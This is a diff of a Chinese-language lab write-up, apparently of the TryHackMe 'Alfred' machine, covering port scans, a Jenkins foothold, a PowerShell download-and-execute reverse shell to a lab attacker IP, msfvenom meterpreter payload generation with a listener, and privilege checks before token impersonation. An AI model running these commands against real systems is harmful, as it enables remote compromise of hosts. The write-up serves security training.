@@ -26,12 +26,14 @@ jenkens 的一个未授权访问的 漏洞 打点同时通道建立 windows nish
 
 ```shell
 # 简单信息收集查看开放端口Scanned at 2024-05-06 13:41:27 BST for 19sNot shown: 997 filtered portsReason: 997 no-responsesPORT     STATE SERVICE       REASON80/tcp   open  http          syn-ack ttl 1283389/tcp open  ms-wbt-server syn-ack ttl 1288080/tcp open  http-proxy    syn-ack ttl 128MAC Address: 02:63:3A:F8:06:C9 (Unknown)
+
 ```
 
 ### [](#详细扫描 "详细扫描")详细扫描
 
 ```shell
 Host is up (0.00030s latency).PORT     STATE    SERVICE    VERSION80/tcp   filtered http3389/tcp open     tcpwrapped| ssl-cert: Subject: commonName=alfred| Not valid before: 2024-05-06T09:05:43|_Not valid after:  2024-11-05T09:05:438080/tcp filtered http-proxyMAC Address: 02:25:99:23:A0:73 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: specialized|WAP|phoneRunning: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embeddedOS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivazOS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phoneNetwork Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.30 ms ip-10-10-140-74.eu-west-1.compute.internal (10.10.140.74)
+
 ```
 
 ### [](#最大的感受-端口太少了-…… "最大的感受 端口太少了 ……")最大的感受 端口太少了 ……
@@ -65,6 +67,7 @@ windows打点
 
 ```powershell
 # 感觉这个可以通用 这个 命令 # 基本调用了powershell中的命令 # 基本上 可以 通杀了 # 先下载之后再进行一个 执行反向连接  powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/ Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port这段PowerShell命令执行的是一个反向TCP PowerShell脚本。让我逐步解释一下：1. `powershell iex`: 这部分调用了PowerShell解释器，并使用`iex`（`Invoke-Expression`）命令来执行后续的脚本或命令。    2. `(New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1')`: 这部分使用`Net.WebClient`对象创建一个Web客户端，并调用`DownloadString`方法从指定的URL下载一个PowerShell脚本（`Invoke-PowerShellTcp.ps1`）。在这里，你需要替换`your-ip`和`your-port`为实际的IP地址和端口号。    3. `Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`: 这部分调用了`Invoke-PowerShellTcp.ps1`脚本，并传递了参数`-Reverse`、`-IPAddress`和`-Port`。`-Reverse`参数表示在反向连接模式下运行，即连接到指定的IP地址和端口。`-IPAddress`和`-Port`参数分别指定了用于反向连接的目标IP地址和端口号，这也需要替换为实际的IP地址和端口号。
+
 ```
 
 #### [](#http服务 "http服务")http服务
@@ -76,6 +79,7 @@ windows打点
 
 ```powershell
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.69.232:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.69.232 -Port 4444
+
 ```
 
 > 直接反向shell 连接回来
@@ -99,6 +103,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.69.232:80
 
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe端口监听use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run注意点 端口监听需要 payloads一致Start-Process "shell_name.exe"
+
 ```
 
 ## [](#提权-– "提权 –>")提权 –>
@@ -113,6 +118,7 @@ windows提权
 
 ```powershell
 "whoami /priv" - SeIncreaseQuotaPrivilege: 调整进程的内存配额权限，目前被禁用。- SeSecurityPrivilege: 管理审计和安全日志的权限，目前被禁用。- SeTakeOwnershipPrivilege: 接管文件或其他对象的权限，目前被禁用。- SeLoadDriverPrivilege: 载入和卸载设备驱动程序的权限，目前被禁用。- SeSystemProfilePrivilege: 为系统性能进行分析的权限，目前被禁用。- SeSystemtimePrivilege: 更改系统时间的权限，目前被禁用。- SeProfileSingleProcessPrivilege: 为单个进程创建性能分析的权限，目前被禁用。- SeIncreaseBasePriorityPrivilege: 增加进程的调度优先级的权限，目前被禁用。- SeCreatePagefilePrivilege: 创建页面文件的权限，目前被禁用。- SeBackupPrivilege: 备份文件和目录的权限，目前被禁用。- SeRestorePrivilege: 恢复文件和目录的权限，目前被禁用。- SeShutdownPrivilege: 关闭系统的权限，目前被禁用。- SeDebugPrivilege: 调试程序的权限，目前已启用。- SeSystemEnvironmentPrivilege: 修改固件环境值的权限，目前被禁用。- SeChangeNotifyPrivilege: 绕过遍历检查的权限，目前已启用。- SeRemoteShutdownPrivilege: 强制从远程系统关闭的权限，目前被禁用。- SeUndockPrivilege: 从停靠站中移除计算机的权限，目前被禁用。- SeManageVolumePrivilege: 执行卷维护任务的权限，目前被禁用。- SeImpersonatePrivilege: 身份验证后模拟客户端的权限，目前已启用。- SeCreateGlobalPrivilege: 创建全局对象的权限，目前已启用。- SeIncreaseWorkingSetPrivilege: 增加进程工作集的权限，目前被禁用。- SeTimeZonePrivilege: 更改时区的权限，目前被禁用。- SeCreateSymbolicLinkPrivilege: 创建符号链接的权限，目前被禁用。
+
 ```
 
 > 利用load incognito 模块去打 这个是个隐身模块
